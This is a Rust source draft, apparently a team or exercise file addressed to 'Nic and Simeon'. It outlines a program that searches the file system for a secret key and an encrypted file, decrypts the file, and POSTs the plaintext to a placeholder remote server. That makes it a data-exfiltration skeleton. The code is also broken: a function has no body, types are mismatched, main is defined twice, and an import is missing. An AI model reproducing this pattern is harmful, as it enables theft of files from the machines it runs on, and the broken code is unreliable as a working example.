// basic outline for this program. Hello, Nic and Simeon here is what I have so far.
use std::fs;
use std::io::{self, Read};
use openssl::symm::{decrypt, Cipher};
//not sure if a remote server exist got to go back and reread the document.
const REMOTE_SERVER_URL: &str = "http://example.com/upload";
const SPECIAL_FILE_NAME: &str = "special_file.txt";
const SECRET_FILE_NAME: &str = "secret_file.txt";

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Find special_file.txt and secret_file.txt
    let special_file_path = find_file(SPECIAL_FILE_NAME)?;
    let secret_key_path = find_file(SECRET_FILE_NAME)?;

    // Read the secret key
    let mut secret_key = String::new();
    read_file(&secret_key_path, &mut secret_key)?;

    // Read the encrypted file
    let mut encrypted_data = Vec::new();
    read_file(&special_file_path, &mut encrypted_data)?;

    // Decrypt the encrypted data
    let decrypted_data = decrypt_file(&encrypted_data, &secret_key)?;

    // Send decrypted data to remote server
    send_to_remote_server(&decrypted_data)?;

    Ok(())
}

fn find_file(file_name: &str) -> Result<String, io::Error> {
    // Implement file scraping here, recursively traverse file system to find the file
    // Return the path to the file
}

fn read_file(file_path: &str, buffer: &mut Vec<u8>) -> Result<(), io::Error> {
    let mut file = fs::File::open(file_path)?;
    file.read_to_end(buffer)?;
    Ok(())
}

fn decrypt_file(data: &[u8], key: &str) -> Result<Vec<u8>, openssl::error::ErrorStack> {
    let cipher = Cipher::aes_256_cbc();
    let decrypted_data = decrypt(cipher, key.as_bytes(), None, data)?;
    Ok(decrypted_data)
}

fn send_to_remote_server(data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    // Implement HTTP request to send data to remote server
    let client = reqwest::blocking::Client::new();
    client.post(REMOTE_SERVER_URL)
        .body(data.to_vec())
        .send()?;
    Ok(())
}
// wiggle sauce my goats 

fn main(){
    print!("Hello Nic and Simeon!")
}